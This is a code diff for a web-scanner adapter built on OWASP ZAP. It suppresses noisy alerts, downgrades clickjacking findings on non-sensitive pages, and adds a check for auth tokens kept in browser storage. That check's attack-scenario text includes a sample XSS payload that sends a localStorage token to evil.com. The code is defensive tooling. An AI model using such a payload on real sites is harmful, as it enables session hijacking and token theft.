@@ -21,6 +21,32 @@ from packages.core.scoring import map_tool_severity
 
 logger = logging.getLogger(__name__)
 
+# Alerts that are noisy/false-positives and should be suppressed or downgraded
+FALSE_POSITIVE_ALERTS = {
+    # Unix timestamps are not sensitive
+    "timestamp disclosure - unix": None,  # None = remove entirely
+    # Cache retrieved = purely informational, not a vulnerability
+    "retrieved from cache": None,
+    # Generic "suspicious" SQL-word comments in source that are not injections
+    "suspicious comments": None,
+}
+
+# Cache-control only relevant if page handles authenticated/sensitive data
+CACHE_CONTROL_ALERT = "re-examine cache-control directives"
+
+# Clickjacking – only flag if there is actual content risk
+CLICKJACKING_ALERTS = {
+    "x-frame-options header not set",
+    "csp: wildcard directive",
+    "content security policy (csp) header not set",
+}
+
+# Sensitive page indicators – if any match, clickjacking risk is real
+SENSITIVE_PAGE_INDICATORS = [
+    "login", "signin", "auth", "account", "profile", "password",
+    "checkout", "payment", "admin", "dashboard", "settings",
+]
+
 # ZAP risk levels mapping
 ZAP_RISK_MAP = {
     "0": FindingSeverity.INFO,
@@ -80,11 +106,12 @@ class ZapAdapter(BaseAdapter):
             "zap.sh",
             "zap-cli",
             "/zap/zap-baseline.py",  # Docker path
-            "/Applications/ZAP.app/Contents/Java/zap.sh",  # MacOS Cask path
+            "/Applications/ZAP.app/Contents/MacOS/ZAP.sh",  # macOS app path
+            "/Applications/ZAP.app/Contents/Java/zap.sh",  # macOS legacy path
         ]
 
         for cmd in possible_commands:
-            if shutil.which(cmd):
+            if shutil.which(cmd) or Path(cmd).is_file():
                 self.zap_command = cmd
                 return True
 
@@ -174,34 +201,46 @@ class ZapAdapter(BaseAdapter):
         with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
             report_path = tmp.name
 
-        cmd = [
-            self.zap_command,
-            "-t",
-            target_url,
-            "-J",
-            report_path,  # JSON report
-        ]
+        # Detect if this is zap.sh (full ZAP) or zap-baseline.py
+        is_zap_sh = self.zap_command.endswith(".sh") or "ZAP.sh" in self.zap_command
 
-        # Add custom rules file if specified
-        rules_file = self.config.get("rules_file")
-        if rules_file:
-            cmd.extend(["-c", rules_file])
+        if is_zap_sh:
+            # zap.sh headless mode: run active scan and generate JSON report
+            cmd = [
+                self.zap_command,
+                "-cmd",
+                "-quickurl", target_url,
+                "-quickout", report_path,
+                "-quickprogress",
+            ]
+        else:
+            # zap-baseline.py style
+            cmd = [
+                self.zap_command,
+                "-t", target_url,
+                "-J", report_path,
+            ]
 
-        # Add authentication if specified
-        if self.config.get("auth_loginurl"):
-            cmd.extend(["-l", self.config["auth_loginurl"]])
-        if self.config.get("auth_username"):
-            cmd.extend(["-u", self.config["auth_username"]])
-        if self.config.get("auth_password"):
-            cmd.extend(["-p", self.config["auth_password"]])
+            # Add custom rules file if specified
+            rules_file = self.config.get("rules_file")
+            if rules_file:
+                cmd.extend(["-c", rules_file])
 
-        # Add ajax spider for JS-heavy sites
-        if self.config.get("ajax_spider", False):
-            cmd.append("-j")
+            # Add authentication if specified
+            if self.config.get("auth_loginurl"):
+                cmd.extend(["-l", self.config["auth_loginurl"]])
+            if self.config.get("auth_username"):
+                cmd.extend(["-u", self.config["auth_username"]])
+            if self.config.get("auth_password"):
+                cmd.extend(["-p", self.config["auth_password"]])
 
-        # Minutes to spider
-        minutes = self.config.get("minutes", 1)
-        cmd.extend(["-m", str(minutes)])
+            # Add ajax spider for JS-heavy sites
+            if self.config.get("ajax_spider", False):
+                cmd.append("-j")
+
+            # Minutes to spider
+            minutes = self.config.get("minutes", 1)
+            cmd.extend(["-m", str(minutes)])
 
         try:
             return_code, stdout, stderr = await self.run_command(
@@ -258,35 +297,143 @@ class ZapAdapter(BaseAdapter):
     def parse_output(self, raw_output: dict[str, Any]) -> list[Finding]:
         """Parse ZAP JSON output into findings."""
         findings = []
+        target_url = ""
 
         site = raw_output.get("site", [])
         if isinstance(site, list):
             for s in site:
+                target_url = s.get("@name", "")
                 alerts = s.get("alerts", [])
                 for alert in alerts:
                     try:
-                        finding = self._parse_alert(alert, s.get("@name", ""))
+                        finding = self._parse_alert(alert, target_url)
                         if finding:
                             finding.fingerprint = self.generate_fingerprint(finding)
                             findings.append(finding)
                     except Exception as e:
                         logger.warning(f"Failed to parse ZAP alert: {e}")
         elif isinstance(site, dict):
+            target_url = site.get("@name", "")
             alerts = site.get("alerts", [])
             for alert in alerts:
                 try:
-                    finding = self._parse_alert(alert, site.get("@name", ""))
+                    finding = self._parse_alert(alert, target_url)
                     if finding:
                         finding.fingerprint = self.generate_fingerprint(finding)
                         findings.append(finding)
                 except Exception as e:
                     logger.warning(f"Failed to parse ZAP alert: {e}")
 
+        # Add auth/storage checks based on the target URL
+        auth_findings = self._check_auth_storage(target_url, raw_output)
+        findings.extend(auth_findings)
+
+        return findings
+
+    def _should_suppress(self, alert_name: str, alert: dict[str, Any]) -> bool:
+        """Return True if this alert is a known false-positive and should be dropped."""
+        name_lower = alert_name.lower()
+
+        # Exact suppression list
+        for pattern, action in FALSE_POSITIVE_ALERTS.items():
+            if pattern in name_lower:
+                return True
+
+        # Cache-control: only flag if it's related to authenticated/sensitive resources
+        if CACHE_CONTROL_ALERT in name_lower:
+            instances = alert.get("instances", [])
+            for inst in instances:
+                uri = inst.get("uri", "").lower()
+                if any(s in uri for s in SENSITIVE_PAGE_INDICATORS):
+                    return False  # Keep – sensitive page
+            return True  # Suppress – not sensitive
+
+        return False
+
+    def _adjust_clickjacking(self, alert_name: str, finding: Finding, target_url: str) -> Finding | None:
+        """Downgrade or suppress clickjacking alerts if page is not sensitive."""
+        name_lower = alert_name.lower()
+        if not any(cj in name_lower for cj in CLICKJACKING_ALERTS):
+            return finding  # Not a clickjacking alert
+
+        url_lower = target_url.lower()
+        if any(s in url_lower for s in SENSITIVE_PAGE_INDICATORS):
+            # Real risk – keep as MEDIUM
+            finding.severity = FindingSeverity.MEDIUM
+            finding.description += (
+                "\n\nNote: This page appears to handle sensitive data (auth/account/payment), "
+                "making clickjacking a real risk."
+            )
+            return finding
+
+        # Not a sensitive page – downgrade to LOW
+        finding.severity = FindingSeverity.LOW
+        finding.confidence = FindingConfidence.LOW
+        finding.description += (
+            "\n\nNote: Downgraded to LOW – page does not appear to handle sensitive data. "
+            "Clickjacking is only a real risk on login, payment, or account pages."
+        )
+        return finding
+
+    def _check_auth_storage(self, target_url: str, raw_output: dict[str, Any]) -> list[Finding]:
+        """
+        Detect insecure auth token storage patterns from ZAP passive scan evidence.
+        Looks for localStorage/sessionStorage usage in responses.
+        """
+        findings = []
+        responses = raw_output.get("responses", []) or raw_output.get("messages", [])
+
+        for resp in responses:
+            body = resp.get("responseBody", "") or resp.get("body", "")
+            url = resp.get("requestHeader", "").split("\n")[0] if "requestHeader" in resp else target_url
+
+            body_lower = body.lower()
+
+            # Check for localStorage/sessionStorage storing tokens
+            if any(kw in body_lower for kw in ["localstorage.setitem", "sessionstorage.setitem"]):
+                if any(t in body_lower for t in ["token", "auth", "jwt", "access_token", "refresh_token"]):
+                    findings.append(Finding(
+                        title="Auth Token Stored in Browser Storage",
+                        severity=FindingSeverity.MEDIUM,
+                        category=FindingCategory.WEB,
+                        confidence=FindingConfidence.MEDIUM,
+                        description=(
+                            "The application stores authentication tokens in localStorage or sessionStorage. "
+                            "These are accessible via JavaScript and can be stolen through XSS attacks."
+                        ),
+                        evidence=Evidence(
+                            tool=self.name,
+                            file_path=url,
+                            snippet="localStorage/sessionStorage token usage detected in response body",
+                        ),
+                        impact=(
+                            "If an XSS vulnerability exists, attackers can steal auth tokens from browser storage "
+                            "and take over user sessions."
+                        ),
+                        attack_scenario=(
+                            "1. Attacker finds XSS on any page of the app\n"
+                            "2. Injects: <script>fetch('https://evil.com/?t='+localStorage.getItem('token'))</script>\n"
+                            "3. Victim's token is exfiltrated\n"
+                            "4. Attacker uses token to authenticate as victim"
+                        ),
+                        recommendation=(
+                            "Store auth tokens in HttpOnly cookies instead of localStorage/sessionStorage. "
+                            "HttpOnly cookies are not accessible via JavaScript and are immune to XSS token theft."
+                        ),
+                        references=["https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html"],
+                    ))
+
         return findings
 
     def _parse_alert(self, alert: dict[str, Any], site_name: str) -> Finding | None:
         """Parse a single ZAP alert into a Finding."""
         alert_name = alert.get("name", "Unknown Alert")
+
+        # Drop known false-positives
+        if self._should_suppress(alert_name, alert):
+            logger.debug(f"Suppressing false-positive alert: {alert_name}")
+            return None
+
         risk_code = str(alert.get("riskcode", "2"))
         confidence_code = str(alert.get("confidence", "2"))
         description = alert.get("desc", "")
@@ -366,6 +513,11 @@ class ZapAdapter(BaseAdapter):
             references=references,
             cwe_id=f"CWE-{cwe_id}" if cwe_id else None,
         )
+
+        # Apply clickjacking risk adjustment
+        finding = self._adjust_clickjacking(alert_name, finding, site_name)
+
+        return finding
 
     def _clean_html(self, text: str) -> str:
         """Remove HTML tags from text."""
